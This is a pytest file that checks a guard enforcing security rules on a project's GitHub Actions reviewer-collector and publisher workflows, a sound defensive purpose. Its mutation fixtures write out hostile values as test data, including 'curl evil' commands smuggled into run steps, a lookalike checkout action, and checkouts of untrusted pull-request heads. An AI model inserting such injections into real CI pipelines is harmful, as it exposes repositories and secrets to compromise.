"""Static contracts of the GitHub-native review workflows, and the guard that enforces them.

The reviewer collector is entered only through GitHub's own ``pull_request_target`` event and holds
no status or contents write. A small trusted publisher (``workflow_run``) is the one place a collector
result becomes a Hunter result. Neither takes identity from a dispatch payload, a run title, or the
``workflow_run`` payload's own description of the triggering run. Each negative case below is paired
with the real, accepted workflow so the guard cannot pass by rejecting everything.
"""

from __future__ import annotations

import copy
import pathlib
import re

import hunter_defect_prevention_preflight as guard
import pytest
import yaml

ROOT = pathlib.Path(__file__).resolve().parents[1]
WORKFLOWS = ROOT / ".github" / "workflows"


def load(name: str) -> dict:
    return yaml.safe_load((WORKFLOWS / name).read_text(encoding="utf-8"))


def triggers(document: dict) -> dict:
    return document[True] if True in document else document["on"]


def collector() -> dict:
    return load("hunter-reviewer-collector.yml")


def publisher() -> dict:
    return load("hunter-collector-publisher.yml")


def collector_step(document: dict) -> dict:
    return next(s for s in document["jobs"]["collect"]["steps"] if "hunter_reviewer_collector" in str(s.get("run")))


def publisher_step(document: dict) -> dict:
    return next(s for s in document["jobs"]["publish"]["steps"] if s.get("id") == "publish")


# --- the real workflows are accepted ------------------------------------------------------------------------


def test_the_real_collector_and_publisher_satisfy_their_guards():
    assert guard.validate_collector_workflow_definition(collector()) == []
    assert guard.validate_collector_publisher_definition(publisher()) == []
    assert guard.validate_review_after_remediation_boundary() == []


def test_the_collector_is_entered_only_through_the_native_pull_request_target_event():
    document = collector()
    assert set(triggers(document)) == {"pull_request_target"}
    options = triggers(document)["pull_request_target"]
    assert options["branches"] == ["main"]
    assert set(options["types"]) == {"opened", "reopened", "synchronize", "ready_for_review"}


def test_the_collector_holds_no_status_or_contents_write_and_certifies_nothing():
    permissions = collector()["permissions"]
    assert permissions == {"contents": "read", "actions": "write", "pull-requests": "write", "statuses": "read"}
    text = (WORKFLOWS / "hunter-reviewer-collector.yml").read_text(encoding="utf-8")
    assert "statuses: write" not in text and "contents: write" not in text


def test_a_newer_event_supersedes_an_older_collector_run_natively():
    concurrency = collector()["concurrency"]
    assert concurrency["cancel-in-progress"] is True
    assert "github.event.pull_request.number" in concurrency["group"]


def test_the_collector_runs_only_default_branch_code():
    steps = collector()["jobs"]["collect"]["steps"]
    checkouts = [s for s in steps if str(s.get("uses", "")).startswith("actions/checkout")]
    assert checkouts
    for step in checkouts:
        assert step["with"]["ref"] == "${{ github.sha }}"
        assert step["with"]["persist-credentials"] is False
    text = (WORKFLOWS / "hunter-reviewer-collector.yml").read_text(encoding="utf-8")
    assert "pull_request.head.ref" not in text and "head.repo" not in text


def test_the_publisher_is_entered_only_by_a_successful_collector_run_and_takes_only_its_id():
    document = publisher()
    assert triggers(document) == {"workflow_run": {"workflows": ["Hunter Reviewer Collector"], "types": ["completed"]}}
    condition = " ".join(document["jobs"]["publish"]["if"].split())
    assert "workflow_run.conclusion == 'success'" in condition
    assert "workflow_run.event == 'pull_request_target'" in condition
    assert publisher_step(document)["env"]["COLLECTOR_RUN_ID"] == "${{ github.event.workflow_run.id }}"


def test_the_publisher_holds_the_only_status_write_and_no_actions_or_contents_write():
    permissions = publisher()["permissions"]
    assert permissions["statuses"] == "write"
    assert permissions["contents"] == "read" and permissions["actions"] == "read"
    assert "write" not in {v for k, v in permissions.items() if k != "statuses"}


def test_no_review_workflow_takes_identity_from_a_payload_a_title_or_the_triggering_run_description():
    for name in ("hunter-reviewer-collector.yml", "hunter-collector-publisher.yml"):
        text = (WORKFLOWS / name).read_text(encoding="utf-8")
        for forbidden in (
            "client_payload",
            "display_title",
            "workflow_run.head_sha",
            "workflow_run.head_branch",
            "workflow_run.pull_requests",
        ):
            assert forbidden not in text, (name, forbidden)


def test_the_retired_workflows_and_wakeups_are_gone():
    assert not (WORKFLOWS / "hunter-governance-reconcile.yml").exists()
    for path in WORKFLOWS.glob("*.yml"):
        text = path.read_text(encoding="utf-8")
        assert "hunter-trusted-recovery" not in text, path.name
        assert not re.search(r"hunter-reviewer-collect(?![a-z-])", text), path.name
        assert "github.event.sender.login" not in text, path.name


def test_merge_readiness_stays_until_native_enforcement_is_verified_but_loses_its_owner_dispatch():
    document = load("hunter-merge-readiness.yml")
    assert "repository_dispatch" not in triggers(document)
    assert "if" not in document["jobs"]["controller"]
    assert "Hunter Collector Result Publisher" in triggers(document)["workflow_run"]["workflows"]
    assert "Hunter Governance Review Reconcile" not in triggers(document)["workflow_run"]["workflows"]


def test_governance_review_re_evaluates_on_exact_head_proofs_resolving_the_pr_from_fresh_state():
    document = load("hunter-governance-review.yml")
    assert set(triggers(document)["workflow_run"]["workflows"]) == {
        "Hunter / Pre-PR Preflight",
        "Hunter / Trusted Preflight Upgrade",
    }
    assert {"ready_for_review", "converted_to_draft"} <= set(triggers(document)["pull_request_target"]["types"])
    step = next(s for s in document["jobs"]["governance-review"]["steps"] if s.get("name", "").startswith("Publish"))
    assert "head.sha ==" in step["run"]  # resolved by exact head commit from fresh API state
    assert "| head" not in step["run"]  # PRH-112: a pipe into `head` under pipefail dies on SIGPIPE
    # Pull requests can share a head commit: every match is evaluated, never just the first.
    assert "for number in ${PR_NUMBERS}" in step["run"] and "read -r PR_NUMBER" not in step["run"]
    assert 'exit "${failures}"' in step["run"]


# --- the guard rejects every mutation of the collector contract ---------------------------------------------


def mutated(document: dict, mutate) -> dict:
    clone = copy.deepcopy(document)
    mutate(clone)
    return clone


COLLECTOR_MUTATIONS = {
    "statuses write": lambda d: d["permissions"].update(statuses="write"),
    "contents write": lambda d: d["permissions"].update(contents="write"),
    "id-token": lambda d: d["permissions"].update({"id-token": "write"}),
    "blanket permissions": lambda d: d.update(permissions="write-all"),
    "job statuses write": lambda d: d["jobs"]["collect"].update(permissions={"statuses": "write"}),
    "no permissions": lambda d: d.pop("permissions"),
    "extra trigger push": lambda d: triggers(d).update(push={"branches": ["**"]}),
    "extra trigger workflow_dispatch": lambda d: triggers(d).update(workflow_dispatch=None),
    "extra trigger repository_dispatch": lambda d: triggers(d).update(repository_dispatch={"types": ["x"]}),
    "pull_request instead": lambda d: (triggers(d).pop("pull_request_target"), triggers(d).update(pull_request={})),
    "all branches": lambda d: triggers(d)["pull_request_target"].pop("branches"),
    "unapproved event type": lambda d: triggers(d)["pull_request_target"]["types"].append("labeled"),
    "checkout of the pr head": lambda d: collector_checkout(d).update(ref="${{ github.event.pull_request.head.sha }}"),
    "checkout of the merge ref": lambda d: collector_checkout(d).update(ref="refs/pull/1/merge"),
    "checkout without ref": lambda d: collector_checkout(d).pop("ref"),
    "persisted credentials": lambda d: collector_checkout(d).update({"persist-credentials": True}),
    "pr number from a payload": lambda d: collector_step(d)["env"].update(
        PR_NUMBER="${{ github.event.client_payload.pr }}"
    ),
    "head from a run title": lambda d: collector_step(d)["env"].update(
        CANDIDATE_HEAD="${{ github.event.workflow_run.display_title }}"
    ),
    "extra command": lambda d: collector_step(d).update(run=collector_step(d)["run"] + " && curl evil"),
    "second command on a new line": lambda d: collector_step(d).update(run=collector_step(d)["run"] + "\ncurl evil"),
    "command before": lambda d: collector_step(d).update(run="curl evil; " + collector_step(d)["run"]),
    "wrong output": lambda d: collector_step(d).update(
        run=collector_step(d)["run"].replace("reviewer-results.json", "x")
    ),
    "custom shell": lambda d: collector_step(d).update(shell="bash {0}"),
    "workflow defaults": lambda d: d.update(defaults={"run": {"shell": "bash"}}),
    "unrelated privileged command step": lambda d: d["jobs"]["collect"]["steps"].append(
        {"run": 'gh workflow run other.yml --ref "$GITHUB_REF"'}
    ),
    "unrelated action step": lambda d: d["jobs"]["collect"]["steps"].append({"uses": "someone/else@v1"}),
    "action step that also runs": lambda d: d["jobs"]["collect"]["steps"].append(
        {"uses": "actions/checkout@v7", "run": "curl evil"}
    ),
    "reusable workflow job": lambda d: d["jobs"].update(extra={"uses": "./.github/workflows/other.yml"}),
    "stepless job": lambda d: d["jobs"].update(extra={"runs-on": "ubuntu-latest"}),
    "lookalike checkout action": lambda d: d["jobs"]["collect"]["steps"].append(
        {"uses": "actions/checkout-evil@v1", "with": {"ref": "main", "persist-credentials": False}}
    ),
    "unpinned checkout action": lambda d: d["jobs"]["collect"]["steps"].append({"uses": "actions/checkout@main"}),
    "downgraded checkout major": lambda d: d["jobs"]["collect"]["steps"][0].update(uses="actions/checkout@v1"),
    "empty permissions": lambda d: d.update(permissions={}),
    "downgraded dispatch grant": lambda d: d["permissions"].update({"actions": "read"}),
    "downgraded comment grant": lambda d: d["permissions"].update({"pull-requests": "read"}),
    "job override drops the grants": lambda d: d["jobs"]["collect"].update(permissions={"contents": "read"}),
    "indirect second invocation": lambda d: d["jobs"]["collect"]["steps"].append(
        {"env": {"S": "scripts/hunter_reviewer_collector.py"}, "run": 'python "$S" --pr 1 --head x'}
    ),
}


def collector_checkout(document: dict) -> dict:
    step = next(
        s for s in document["jobs"]["collect"]["steps"] if str(s.get("uses", "")).startswith("actions/checkout")
    )
    return step["with"]


@pytest.mark.parametrize("name", sorted(COLLECTOR_MUTATIONS))
def test_the_guard_rejects_each_collector_contract_violation(name):
    assert guard.validate_collector_workflow_definition(mutated(collector(), COLLECTOR_MUTATIONS[name])), name


@pytest.mark.parametrize(
    "variant",
    [
        lambda d: d["jobs"]["collect"].update({"timeout-minutes": 60}),
        lambda d: d.update(**{"run-name": "anything"}),
        lambda d: collector_step(d).update(name="renamed step"),
        lambda d: d["jobs"]["collect"]["steps"][0].update(uses="actions/checkout@" + "a" * 40),
        lambda d: d["jobs"]["collect"]["steps"][0].update(uses="actions/checkout@v7.1.0"),
        lambda d: d["jobs"]["collect"].update(permissions=dict(d["permissions"])),
        lambda d: d["jobs"]["collect"]["steps"][-1].update(name="Upload receipt"),
        lambda d: collector_step(d).update(run=collector_step(d)["run"].replace("python ", "python3 ")),
        lambda d: collector_step(d).update(run="  " + collector_step(d)["run"] + "  "),
        lambda d: collector_step(d)["env"].update(EXTRA_SECRET="${{ secrets.GROQ_API_KEY }}"),
        lambda d: triggers(d)["pull_request_target"]["types"].remove("reopened"),
    ],
)
def test_the_guard_accepts_canonically_equivalent_collector_spellings(variant):
    assert guard.validate_collector_workflow_definition(mutated(collector(), variant)) == []


@pytest.mark.parametrize("key", [True, "on"])
def test_quoted_and_unquoted_on_keys_are_the_same_trigger(key):
    document = collector()
    renamed = {("on" if k is True else k): v for k, v in document.items()}
    assert guard.validate_collector_workflow_definition(renamed) == []
    widened = {k: v for k, v in document.items() if k is not True}
    widened[key] = {**triggers(document), "push": {"branches": ["**"]}}
    assert guard.validate_collector_workflow_definition(widened)
    both = {**document, "on": {"push": None}}
    assert guard.validate_collector_workflow_definition(both)


@pytest.mark.parametrize("malformed", [None, [], "x", {"jobs": []}, {"jobs": "x"}, {}, {"jobs": {"a": None}}])
def test_malformed_workflows_produce_guard_errors_not_exceptions(malformed):
    assert guard.validate_collector_workflow_definition(malformed)
    assert guard.validate_collector_publisher_definition(malformed)


# --- the guard rejects every mutation of the publisher contract ----------------------------------------------


def publisher_checkout(document: dict) -> dict:
    step = next(
        s for s in document["jobs"]["publish"]["steps"] if str(s.get("uses", "")).startswith("actions/checkout")
    )
    return step["with"]


def refresh_step(document: dict) -> dict:
    return next(s for s in document["jobs"]["publish"]["steps"] if "bootstrap_external_review_469" in str(s.get("run")))


PUBLISHER_MUTATIONS = {
    "actions write": lambda d: d["permissions"].update(actions="write"),
    "contents write": lambda d: d["permissions"].update(contents="write"),
    "blanket permissions": lambda d: d.update(permissions="write-all"),
    "no permissions": lambda d: d.pop("permissions"),
    "job contents write": lambda d: d["jobs"]["publish"].update(permissions={"contents": "write"}),
    "extra trigger": lambda d: triggers(d).update(push={"branches": ["**"]}),
    "pull_request_target trigger": lambda d: triggers(d).update(pull_request_target={}),
    "any workflow": lambda d: triggers(d)["workflow_run"].update(workflows=["Hunter Reviewer Collector", "CI"]),
    "another workflow": lambda d: triggers(d)["workflow_run"].update(workflows=["CI"]),
    "not only completed": lambda d: triggers(d)["workflow_run"].update(types=["completed", "requested"]),
    "no success condition": lambda d: d["jobs"]["publish"].update(
        {"if": "github.event.workflow_run.event == 'pull_request_target'"}
    ),
    "no event condition": lambda d: d["jobs"]["publish"].update(
        {"if": "github.event.workflow_run.conclusion == 'success'"}
    ),
    "no condition": lambda d: d["jobs"]["publish"].pop("if"),
    "checkout of the triggering head": lambda d: publisher_checkout(d).update(
        ref="${{ github.event.workflow_run.head_sha }}"
    ),
    "checkout of a branch name": lambda d: publisher_checkout(d).update(
        ref="${{ github.event.workflow_run.head_branch }}"
    ),
    "persisted credentials": lambda d: publisher_checkout(d).update({"persist-credentials": True}),
    "run id from a title": lambda d: publisher_step(d)["env"].update(
        COLLECTOR_RUN_ID="${{ github.event.workflow_run.display_title }}"
    ),
    "run id from a payload": lambda d: publisher_step(d)["env"].update(
        COLLECTOR_RUN_ID="${{ github.event.client_payload.run }}"
    ),
    "pr from the run payload": lambda d: publisher_step(d)["env"].update(
        PR="${{ github.event.workflow_run.pull_requests[0].number }}"
    ),
    "extra command": lambda d: publisher_step(d).update(run=publisher_step(d)["run"] + " ; curl evil"),
    "second command on a new line": lambda d: publisher_step(d).update(run=publisher_step(d)["run"] + "\ncurl evil"),
    "second publishing step": lambda d: d["jobs"]["publish"]["steps"].append(copy.deepcopy(publisher_step(d))),
    "run attempt from a payload": lambda d: publisher_step(d)["env"].update(
        COLLECTOR_RUN_ATTEMPT="${{ github.event.client_payload.attempt }}"
    ),
    "unrelated status-writing step": lambda d: d["jobs"]["publish"]["steps"].append(
        {"run": 'gh api -X POST "repos/$GITHUB_REPOSITORY/statuses/$SHA" -f state=success'}
    ),
    "unrelated action step": lambda d: d["jobs"]["publish"]["steps"].append({"uses": "someone/else@v1"}),
    "reusable workflow job": lambda d: d["jobs"].update(extra={"uses": "./.github/workflows/other.yml"}),
    "stepless job": lambda d: d["jobs"].update(extra={"runs-on": "ubuntu-latest"}),
    "downgraded checkout major": lambda d: d["jobs"]["publish"]["steps"][0].update(uses="actions/checkout@v1"),
    "lookalike checkout action": lambda d: d["jobs"]["publish"]["steps"].append(
        {"uses": "actions/checkout-evil@v1", "with": {"ref": "main", "persist-credentials": False}}
    ),
    "empty permissions": lambda d: d.update(permissions={}),
    "downgraded status grant": lambda d: d["permissions"].update({"statuses": "read"}),
    "job override drops the status grant": lambda d: d["jobs"]["publish"].update(permissions={"contents": "read"}),
    "refresh of an unverified pull request": lambda d: refresh_step(d)["env"].update(
        VERIFIED_PR_NUMBER="${{ github.event.workflow_run.pull_requests[0].number }}"
    ),
    "refresh with another command": lambda d: refresh_step(d).update(run=refresh_step(d)["run"] + " ; curl evil"),
}


@pytest.mark.parametrize("name", sorted(PUBLISHER_MUTATIONS))
def test_the_guard_rejects_each_publisher_contract_violation(name):
    assert guard.validate_collector_publisher_definition(mutated(publisher(), PUBLISHER_MUTATIONS[name])), name


@pytest.mark.parametrize(
    "variant",
    [
        lambda d: d["jobs"]["publish"].update({"timeout-minutes": 20}),
        lambda d: publisher_step(d).update(name="renamed"),
        lambda d: refresh_step(d).update(name="renamed refresh"),
        lambda d: refresh_step(d).pop("if"),
        lambda d: d["jobs"]["publish"].update(permissions=dict(d["permissions"])),
        lambda d: d["jobs"]["publish"].update(
            {
                "if": " github.event.workflow_run.event == 'pull_request_target'\n && github.event.workflow_run.conclusion == 'success' "
            }
        ),
    ],
)
def test_the_guard_accepts_canonically_equivalent_publisher_spellings(variant):
    assert guard.validate_collector_publisher_definition(mutated(publisher(), variant)) == []


def test_the_dispatch_path_cannot_come_back_through_the_orchestrator_module():
    import hunter_review_orchestrator as orchestration

    for retired in (
        "dispatch_collector",
        "ensure_collector",
        "ensure_current",
        "elect_collector_owner",
        "claim_collector_run",
        "bind_dispatched_run",
        "collector_run_authority",
        "outstanding_collector_runs",
        "publish_trusted_collector_completion",
        "collector_run_name",
    ):
        assert not hasattr(orchestration, retired), retired
